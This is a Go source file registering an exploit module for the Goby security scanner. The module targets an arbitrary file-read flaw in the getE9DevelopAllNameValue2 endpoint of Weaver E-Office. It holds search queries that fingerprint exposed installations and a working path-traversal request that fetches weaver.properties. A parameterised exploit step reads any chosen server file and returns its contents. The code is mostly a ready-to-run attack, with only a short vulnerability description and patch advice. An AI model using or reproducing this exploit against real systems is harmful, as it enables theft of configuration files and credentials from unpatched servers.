package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "Weaver E-Office getE9DevelopAllNameValue2 file reading vulnerability",
    "Description": "<p>Panwei E-Office is an office automation (Office Automation, referred to as OA) system developed by Panwei Network Technology Co., Ltd.</p><p>It is a Web-based collaborative office platform that can help enterprises achieve an electronic, automated, and intelligent office environment.</p><p>There is an arbitrary file reading vulnerability in the Panwei E-Office getE9DevelopAllNameValue2 file. An attacker can use this vulnerability to read any file on the server and obtain sensitive information on the server.</p>",
    "Product": "Weaver E-Office",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2024-03-06",
    "PostTime": "2024-03-08",
    "Author": "2367018324@qq.com",
    "FofaQuery": "body=\"href=\\\"/eoffice\" || body=\"/eoffice10/client\" || body=\"eoffice_loading_tip\" || body=\"eoffice_init\" || header=\"general/login/index.php\" || banner=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"eOffice\" || banner=\"eOffice\" || header=\"LOGIN_LANG\" || banner=\"LOGIN_LANG\" || body=\"/wui/index.html\"",
    "GobyQuery": "body=\"href=\\\"/eoffice\" || body=\"/eoffice10/client\" || body=\"eoffice_loading_tip\" || body=\"eoffice_init\" || header=\"general/login/index.php\" || banner=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"eOffice\" || banner=\"eOffice\" || header=\"LOGIN_LANG\" || banner=\"LOGIN_LANG\" || body=\"/wui/index.html\"",
    "Level": "3",
    "Impact": "<p>There is an arbitrary file reading vulnerability in the Panwei E-Office getE9DevelopAllNameValue2 file. An attacker can use this vulnerability to read any file on the server and obtain sensitive information on the server.</p>",
    "Recommendation": "<p>Please pay attention to the update manufacturer to release patches to fix vulnerabilities in a timely manner: <a href=\"https://www.weaver.com.cn.\">https://www.weaver.com.cn.</a></p>",
    "References": [
        "https://www.weaver.com.cn/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "../weaver.properties",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_/../weaver.properties",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "ecology.url",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_/../weaver.properties",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_/../weaver.properties"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_/{{{filePath}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "OR",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "ecology.url",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "泛微 E-Office getE9DevelopAllNameValue2 文件读取漏洞",
            "Product": "泛微 E-Office",
            "Description": "<p>泛微 E-Office 是一款由泛微网络科技股份有限公司开发的办公自动化（Office Automation，简称 OA ）系统。</p><p>它是一种基于Web的协同办公平台，可以帮助企业实现电子化、自动化、智能化的办公环境。</p><p>泛微 E-Office getE9DevelopAllNameValue2 文件存在任意文件读取漏洞，攻击者可利用该漏洞读取服务器任意文件，获取服务器敏感信息。</p>",
            "Recommendation": "<p>请及时关注更新厂商发布补丁以修复漏洞：<a href=\"https://www.weaver.com.cn\">https://www.weaver.com.cn</a>。<br></p>",
            "Impact": "<p>泛微 E-Office getE9DevelopAllNameValue2 文件存在任意文件读取漏洞，攻击者可利用该漏洞读取服务器任意文件，获取服务器敏感信息。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Weaver E-Office getE9DevelopAllNameValue2 file reading vulnerability",
            "Product": "Weaver E-Office",
            "Description": "<p>Panwei E-Office is an office automation (Office Automation, referred to as OA) system developed by Panwei Network Technology Co., Ltd.</p><p>It is a Web-based collaborative office platform that can help enterprises achieve an electronic, automated, and intelligent office environment.</p><p>There is an arbitrary file reading vulnerability in the Panwei E-Office getE9DevelopAllNameValue2 file. An attacker can use this vulnerability to read any file on the server and obtain sensitive information on the server.</p>",
            "Recommendation": "<p>Please pay attention to the update manufacturer to release patches to fix vulnerabilities in a timely manner: <a href=\"https://www.weaver.com.cn.\">https://www.weaver.com.cn.</a><br></p>",
            "Impact": "<p>There is an arbitrary file reading vulnerability in the Panwei E-Office getE9DevelopAllNameValue2 file. An attacker can use this vulnerability to read any file on the server and obtain sensitive information on the server.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10936"
}`

  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    nil,
    nil,
  ))
}